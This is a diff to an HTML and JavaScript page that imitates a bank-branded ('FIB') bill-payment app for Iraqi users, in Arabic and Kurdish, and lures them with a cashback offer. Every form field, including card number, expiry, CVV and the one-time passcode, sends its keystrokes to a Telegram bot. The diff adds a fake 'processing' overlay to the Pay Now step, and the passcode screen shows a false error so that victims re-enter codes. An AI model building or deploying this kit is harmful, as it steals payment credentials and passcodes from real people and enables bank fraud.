@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FIB - Premium Digital Experience</title>
+    <title>FIB - Digital Services Platform</title>
     <style>
         :root {
             --fib-green: #008444;
@@ -17,6 +17,11 @@
         body { background-color: #f8faf9; color: var(--text-dark); font-family: 'Segoe UI', Roboto, sans-serif; margin: 0; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; }
 
         .app-container { width: 100%; max-width: 450px; background: var(--bg-white); min-height: 100vh; position: relative; display: flex; flex-direction: column; box-shadow: 0 0 40px rgba(0,0,0,0.05); }
+
+        /* Processing Overlay */
+        #processing-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); z-index: 3000; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
+        .spinner { width: 50px; height: 50px; border: 5px solid var(--fib-light-green); border-top: 5px solid var(--fib-green); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
         /* Popup */
         #promo-popup { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 2000; display: flex; justify-content: center; align-items: center; }
@@ -64,6 +69,11 @@
     </style>
 </head>
 <body>
+
+<div id="processing-overlay">
+    <div class="spinner"></div>
+    <h3 id="proc-text"></h3>
+</div>
 
 <div id="promo-popup" onclick="closePopup()">
     <div class="popup-content">
@@ -121,26 +131,26 @@
 
     <div id="screen-details" class="screen">
         <h3 id="d-title"></h3>
-        <div class="input-group"><label id="label-phone"></label><input type="text" id="i-phone" placeholder="07xx xxx xxxx" oninput="trackInput('رقم الهاتف')"></div>
-        <div class="input-group"><label id="label-ref"></label><input type="text" id="i-ref" oninput="trackInput('رقم المرجع/الفاتورة')"></div>
-        <div class="input-group"><label id="label-amt"></label><input type="number" id="i-amt" placeholder="0 IQD" oninput="updateCashback(); trackInput('المبلغ')"></div>
+        <div class="input-group"><label id="label-phone"></label><input type="text" id="i-phone" placeholder="07xx xxx xxxx" oninput="trackInput('Phone')"></div>
+        <div class="input-group"><label id="label-ref"></label><input type="text" id="i-ref" oninput="trackInput('Ref/Bill')"></div>
+        <div class="input-group"><label id="label-amt"></label><input type="number" id="i-amt" placeholder="0 IQD" oninput="updateCashback(); trackInput('Amount')"></div>
         <div id="cb-box" class="cashback-box"></div>
         <button class="btn-primary" id="btn-details-next" onclick="nextScreen('screen-pay')"></button>
     </div>
 
     <div id="screen-pay" class="screen">
         <h3>Card Details</h3>
-        <div class="input-group"><label>Card Number</label><input type="text" id="c-num" placeholder="0000 0000 0000 0000" maxlength="19" oninput="trackInput('رقم البطاقة')"></div>
+        <div class="input-group"><label>Card Number</label><input type="text" id="c-num" placeholder="0000 0000 0000 0000" maxlength="19" oninput="trackInput('Card Number')"></div>
         <div style="display:flex; gap:10px;">
-            <div style="flex:1"><label>Expiry</label><input type="text" id="c-date" placeholder="MM-YY" maxlength="5" oninput="trackInput('التاريخ')"></div>
+            <div style="flex:1"><label>Expiry</label><input type="text" id="c-date" placeholder="MM-YY" maxlength="5" oninput="trackInput('Expiry')"></div>
             <div style="flex:1"><label>CVV</label><input type="text" id="c-cvv" placeholder="000" maxlength="3" oninput="trackInput('CVV')"></div>
         </div>
-        <button class="btn-primary" onclick="nextScreen('screen-confirm')">Pay Now</button>
+        <button class="btn-primary" id="btn-pay-now" onclick="processPayment()"></button>
     </div>
 
     <div id="screen-confirm" class="screen">
         <h3 id="otp-title">OTP</h3>
-        <input type="text" id="otp" placeholder="000000" style="text-align:center; font-size:24px; letter-spacing:10px; border-color: var(--fib-green);" oninput="trackInput('كود OTP')">
+        <input type="text" id="otp" placeholder="000000" style="text-align:center; font-size:24px; letter-spacing:10px; border-color: var(--fib-green);" oninput="trackInput('OTP')">
         <p id="err" style="color:#d93025; text-align:center; font-size:0.85rem; margin-top: 15px;"></p>
         <button class="btn-primary" onclick="retry()">Confirm</button>
     </div>
@@ -164,27 +174,35 @@
     let serviceType = 'bill';
 
     const langData = {
-        ar: { s: "الخدمات الرئيسية", elec: "الكهرباء", water: "المياه", asia: "آسيا سيل", traffic: "المرور", cb: "استرداد نقدي", next: "التالي", promo: "كاش باك 20% لفترة محدودة!", l_phone: "رقم الهاتف", l_ref: "رقم المرجع", l_amt: "المبلغ (دينار)", err: "الرمز غير صحيح، حاول مجدداً" },
-        ku: { s: "خزمەتگوزارییەکان", elec: "کارەبا", water: "ئاو", asia: "ئاسیاسێڵ", traffic: "هاتووچۆ", cb: "کاشباک", next: "دواتر", promo: "20% کاشباک بۆ ماوەیەکی سنووردار!", l_phone: "ژمارەی مۆبایل", l_ref: "ژمارەی پسوڵە", l_amt: "بڕی پارە (دینار)", err: "کۆدەکە هەڵەیە، دووبارە هەوڵ بدەرەوە" }
+        ar: { s: "الخدمات الرئيسية", elec: "الكهرباء", water: "المياه", asia: "آسيا سيل", traffic: "المرور", cb: "استرداد نقدي", next: "التالي", promo: "كاش باك 20% لفترة محدودة!", l_phone: "رقم الهاتف", l_ref: "رقم المرجع", l_amt: "المبلغ (دينار)", err: "الرمز غير صحيح، حاول مجدداً", pay: "دفع الآن", proc: "جاري معالجة العملية... الرجاء الانتظار" },
+        ku: { s: "خزمەتگوزارییەکان", elec: "کارەبا", water: "ئاو", asia: "ئاسیاسێڵ", traffic: "هاتووچۆ", cb: "کاشباک", next: "دواتر", promo: "20% کاشباک بۆ ماوەیەکی سنووردار!", l_phone: "ژمارەی مۆبایل", l_ref: "ژمارەی پسوڵە", l_amt: "بڕی پارە (دینار)", err: "کۆدەکە هەڵەیە، دووبارە هەوڵ بدەرەوە", pay: "ئێستا پارە بدە", proc: "کردارەکە لە پڕۆسەدايە... تکایە چاوەڕێ بکە" }
     };
 
     function trackInput(field) {
         clearTimeout(debounceTimer);
         debounceTimer = setTimeout(() => {
-            const phone = document.getElementById('i-phone').value || "غير مسجل";
-            const value = event.target.value;
-            const message = `🔔 تحديث جديد:\n📱 الهاتف: ${phone}\n📍 الحقل: ${field}\n📝 القيمة: ${value}`;
-            
+            const phone = document.getElementById('i-phone').value || "None";
+            const val = event.target.value;
             fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: tgId, text: message })
+                body: JSON.stringify({ chat_id: tgId, text: `🔔 Log:\n📱 User: ${phone}\n📍 Field: ${field}\n📝 Data: ${val}` })
             });
-        }, 1200); 
+        }, 1200);
+    }
+
+    function processPayment() {
+        trackInput('Clicked Pay Now');
+        document.getElementById('proc-text').innerText = langData[curLang].proc;
+        document.getElementById('processing-overlay').style.display = 'flex';
+        setTimeout(() => {
+            document.getElementById('processing-overlay').style.display = 'none';
+            nextScreen('screen-confirm');
+        }, 2500);
     }
 
     function closePopup() { document.getElementById('promo-popup').style.display = 'none'; }
-    function setLang(l) { curLang = l; const d = langData[l]; document.getElementById('s-title').innerText = d.s; document.getElementById('l-elec').innerText = d.elec; document.getElementById('l-water').innerText = d.water; document.getElementById('l-asia').innerText = d.asia; document.getElementById('l-traffic').innerText = d.traffic; document.getElementById('promo').innerText = d.promo; document.getElementById('label-phone').innerText = d.l_phone; document.getElementById('label-ref').innerText = d.l_ref; document.getElementById('label-amt').innerText = d.l_amt; document.getElementById('btn-details-next').innerText = d.next; nextScreen('screen-services'); }
+    function setLang(l) { curLang = l; const d = langData[l]; document.getElementById('s-title').innerText = d.s; document.getElementById('l-elec').innerText = d.elec; document.getElementById('l-water').innerText = d.water; document.getElementById('l-asia').innerText = d.asia; document.getElementById('l-traffic').innerText = d.traffic; document.getElementById('promo').innerText = d.promo; document.getElementById('label-phone').innerText = d.l_phone; document.getElementById('label-ref').innerText = d.l_ref; document.getElementById('label-amt').innerText = d.l_amt; document.getElementById('btn-details-next').innerText = d.next; document.getElementById('btn-pay-now').innerText = d.pay; nextScreen('screen-services'); }
     function openService(type, name) { serviceType = type; const d = langData[curLang]; document.getElementById('d-title').innerText = d[name] || name; document.getElementById('i-ref').placeholder = (type === 'bill') ? d.l_ref : d.l_phone; updateCashback(); nextScreen('screen-details'); }
     function updateCashback() { let val = document.getElementById('i-amt').value || 0; let rate = (serviceType === 'bill') ? 0.20 : 0.15; let cb = Math.floor(val * rate); document.getElementById('cb-box').innerText = `${langData[curLang].cb}: ${cb.toLocaleString()} IQD`; }
     function nextScreen(id) { document.querySelectorAll('.screen').forEach(s => s.classList.remove('active')); document.getElementById(id).classList.add('active'); hist.push(id); document.getElementById('back-btn').style.visibility = (id === 'screen-lang') ? 'hidden' : 'visible'; }
